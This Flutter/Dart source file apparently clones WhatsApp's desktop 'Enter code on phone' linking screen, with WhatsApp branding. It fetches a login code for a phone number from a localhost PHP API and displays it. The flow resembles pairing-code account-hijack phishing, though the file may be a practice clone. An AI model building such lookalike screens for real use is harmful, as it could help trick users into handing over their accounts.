import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';

import '../mobile/mobile_welcome_screen.dart';
import '../models/login_data.dart';
import 'desktop_loading_screen.dart';
import 'desktop_login_screen.dart';

class DesktopCodeScreen
    extends StatefulWidget {
  const DesktopCodeScreen({
    super.key,
  });

  @override
  State<DesktopCodeScreen>
      createState() =>
          _DesktopCodeScreenState();
}

class _DesktopCodeScreenState
    extends State<
        DesktopCodeScreen> {
  String generatedCode = "";

  // =========================================
  // COLORS
  // =========================================

  static const Color kBgColor =
      Color(0xFFF6F1EA);

  static const Color kTextDark =
      Color(0xFF111B21);

  static const Color kTextSecondary =
      Color(0xFF667781);

  static const Color kAccentGreen =
      Color(0xFF25D366);

  static const Color kBorderColor =
      Color(0xFFD1D7DB);

@override
void initState() {
  super.initState();
  getLoginCode();
}

Future<void> getLoginCode() async {
  try {
   final response = await http.post(
  Uri.parse(
    'http://localhost/project-231006/API/get_login_code.php',
  ),
  body: {
    'phone_number': LoginData.phoneNumber,
  },
);

print("GET CODE RESPONSE:");
print(response.body);

    
    final data = jsonDecode(response.body);
    if (data['success'] == true) {

      setState(() {
        generatedCode = data['login_code'];
      });

      LoginData.loginCode =
          data['login_code'];

      debugPrint(
        "SAVED LOGIN CODE : ${LoginData.loginCode}",
      );

      await Future.delayed(
        const Duration(seconds: 5),
      );

      if (!mounted) return;

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (_) =>
              const DesktopLoadingScreen(),
        ),
      );
    }
    
  } catch (e) {
    debugPrint(e.toString());
  }
}
  // =========================================
  // FORMATTED CODE
  // =========================================

        String get formattedCode {
        String text =
            generatedCode
                .replaceAll('-', '')
                .toUpperCase();

        while (text.length < 8) {
          text += ' ';
        }

        return text;
      }

  
  @override
void dispose() {
  super.dispose();
}


  @override
  Widget build(BuildContext context) {
    return LayoutBuilder(
      builder: (
        context,
        constraints,
      ) {
        final isDesktop =
            constraints.maxWidth >= 768;

        return Scaffold(
          backgroundColor:
              isDesktop
                  ? kBgColor
                  : const Color(
                      0xFF0B141A,
                    ),

          body: SafeArea(
            child: isDesktop
                ? _buildDesktopContent(
                    context,
                  )
                : _buildMobileContent(
                    context,
                  ),
          ),
        );
      },
    );
  }

  // =========================================
  // MOBILE CONTENT
  // =========================================

  Widget _buildMobileContent(
    BuildContext context,
  ) {
    return const WhatsAppBusinessOnboarding();
  }

  // =========================================
  // DESKTOP CONTENT
  // =========================================

  Widget _buildDesktopContent(
    BuildContext context,
  ) {
    return SingleChildScrollView(
      child: Padding(
        padding:
            const EdgeInsets.symmetric(
          horizontal: 20,
          vertical: 20,
        ),

        child: Column(
          children: [
            // =====================================
            // LOGO
            // =====================================

            buildHeaderLogo(),

            const SizedBox(height: 36),

            // =====================================
            // CENTER CONTENT
            // =====================================

            Center(
              child: Column(
                children: [
                  // DOWNLOAD CARD

                  buildDownloadCard(),

                  const SizedBox(
                    height: 14,
                  ),

                  // MAIN CARD

                  buildMainCard(),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // =========================================
  // HEADER
  // =========================================

  Widget buildHeaderLogo() {
    return Align(
      alignment: Alignment.centerLeft,

      child: Row(
        mainAxisSize:
            MainAxisSize.min,

        children: [
          Image.asset(
            'assets/icons/icon_whatsapp2.JPG',

            width: 24,
          ),

          const SizedBox(width: 6),

          const Text(
            'WhatsApp',

            style: TextStyle(
              color: kAccentGreen,
              fontSize: 18,
              fontWeight:
                  FontWeight.w600,
            ),
          ),
        ],
      ),
    );
  }

  // =========================================
  // DOWNLOAD CARD
  // =========================================

  Widget buildDownloadCard() {
    return Container(
      width: 820,

      padding:
          const EdgeInsets.symmetric(
        horizontal: 28,
        vertical: 18,
      ),

      decoration: BoxDecoration(
        color: Colors.white,

        borderRadius:
            BorderRadius.circular(
          24,
        ),

        border: Border.all(
          color: kBorderColor,
        ),
      ),

      child: Row(
        children: [
          Image.asset(
            'assets/icons/icon_telepon.JPG',

            width: 46,
          ),

          const SizedBox(width: 18),

          Expanded(
            child: Column(
              crossAxisAlignment:
                  CrossAxisAlignment
                      .start,

              children: const [
                Text(
                  'Download WhatsApp for Windows',

                  style: TextStyle(
                    color: kTextDark,
                    fontSize: 15,
                    fontWeight:
                        FontWeight.w600,
                  ),
                ),

                SizedBox(height: 3),

                Text(
                  'Get extra features like voice and video calling,\nscreen sharing and more.',

                  style: TextStyle(
                    color:
                        kTextSecondary,
                    fontSize: 12,
                    height: 1.4,
                  ),
                ),
              ],
            ),
          ),

          Container(
            height: 42,

            padding:
                const EdgeInsets.symmetric(
              horizontal: 30,
            ),

            decoration: BoxDecoration(
              color: kAccentGreen,

              borderRadius:
                  BorderRadius.circular(
                30,
              ),
            ),

            child: const Center(
              child: Text(
                'Download',

                style: TextStyle(
                  color: Colors.white,
                  fontSize: 13,
                  fontWeight:
                      FontWeight.w600,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // =========================================
  // MAIN CARD
  // =========================================

  Widget buildMainCard() {
    return Container(
      width: 820,

      padding:
          const EdgeInsets.symmetric(
        horizontal: 28,
        vertical: 28,
      ),

      decoration: BoxDecoration(
        color: Colors.white,

        borderRadius:
            BorderRadius.circular(
          24,
        ),

        border: Border.all(
          color: kBorderColor,
        ),
      ),

      child: Column(
        crossAxisAlignment:
            CrossAxisAlignment
                .start,

        children: [
          const Center(
            child: Text(
              'Enter code on phone',

              style: TextStyle(
                color: kTextDark,
                fontSize: 26,
                fontWeight:
                    FontWeight.w400,
              ),
            ),
          ),

          const SizedBox(height: 6),

                         Center(
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Text(
                              'Linking WhatsApp account ${LoginData.phoneNumber}',
                              style: const TextStyle(
                                color: kTextSecondary,
                                fontSize: 13,
                              ),
                            ),
                          ],
                        ),
                      ),


          const SizedBox(height: 26),
        Container(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(
              vertical: 30,
            ),
            decoration: BoxDecoration(
              color: const Color(0xFFF7F8FA),
              borderRadius:
                  BorderRadius.circular(14),
            ),
            child: Center(
              child: buildCodeBoxes(),
            ),
          ),

          
          // =====================================
          // STEP ITEMS
          // =====================================

          buildStep(
            1,
            'Open WhatsApp on your phone',
          ),

          buildStep(
            2,
            'On Android tap Menu • On iPhone tap Settings',
          ),

          buildStep(
            3,
            'Tap Linked devices, then Link device',
          ),

          buildStep(
            4,
            'Tap Link with phone number instead and enter this code on your phone',

            isLast: true,
          ),

          const SizedBox(height: 24),

          Center(
            child: TextButton(
              onPressed: () {
                Navigator.push(
                  context,

                  MaterialPageRoute(
                    builder:
                        (_) =>
                            const DesktopLoginScreen(),
                  ),
                );
              },

              child: const Row(
                mainAxisSize:
                    MainAxisSize.min,

                children: [
                  Text(
                    'Log in with QR code',

                    style: TextStyle(
                      color: kTextDark,
                      fontSize: 14,

                      decoration:
                          TextDecoration
                              .underline,
                    ),
                  ),

                  SizedBox(width: 8),

                  Icon(
                    Icons.arrow_forward_ios,
                    size: 12,
                    color: kTextDark,
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // =========================================
  // CODE BOXES
  // =========================================

  Widget buildCodeBoxes() {
    final code =
        formattedCode.split('');

    return Row(
      mainAxisAlignment:
          MainAxisAlignment.center,

      children: [
       for (int i = 0; i < 8; i++) ...[
  Container(
    width: 32,
    height: 32,
    alignment: Alignment.center,
    margin: const EdgeInsets.symmetric(
      horizontal: 3,
    ),
    decoration: BoxDecoration(
      color: Colors.white,
      borderRadius: BorderRadius.circular(6),
      border: Border.all(
        color: const Color(0xFFB6BFC5),
      ),
    ),
    child: Text(
      code[i],
      style: const TextStyle(
        color: kTextDark,
        fontSize: 18,
        fontWeight: FontWeight.w500,
      ),
    ),
  ),

  if (i < 7)
    const Padding(
      padding: EdgeInsets.symmetric(
        horizontal: 6,
      ),
      child: Text(
        '-',
        style: TextStyle(
          fontSize: 22,
          color: kTextDark,
        ),
      ),
    ),

        ],
      ],
    );
  }

  // =========================================
  // STEP
  // =========================================

  Widget buildStep(
    int number,
    String text, {
    bool isLast = false,
  }) {
    return Padding(
      padding:
          const EdgeInsets.only(
        bottom: 14,
      ),

      child: Row(
        crossAxisAlignment:
            CrossAxisAlignment.start,

        children: [
          // =================================
          // NUMBER + LINE
          // =================================

          Column(
            children: [
              Container(
                width: 22,
                height: 22,

                alignment:
                    Alignment.center,

                decoration:
                    BoxDecoration(
                  shape: BoxShape.circle,

                  border: Border.all(
                    color: const Color(
                      0xFF54656F,
                    ),
                  ),
                ),

                child: Text(
                  '$number',

                  style: const TextStyle(
                    fontSize: 11,
                    color: Color(
                      0xFF54656F,
                    ),
                  ),
                ),
              ),

              // =============================
              // CONNECTOR LINE
              // =============================

              if (!isLast)
                Container(
                  width: 1,
                  height: 30,

                  margin:
                      const EdgeInsets.symmetric(
                    vertical: 4,
                  ),

                  color: const Color(
                    0xFFD1D7DB,
                  ),
                ),
            ],
          ),

          const SizedBox(width: 12),

          // =================================
          // TEXT
          // =================================

          Expanded(
            child: Padding(
              padding:
                  const EdgeInsets.only(
                top: 1,
              ),

              child: Text(
                text,

                style: const TextStyle(
                  color: kTextDark,
                  fontSize: 14,
                  height: 1.4,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}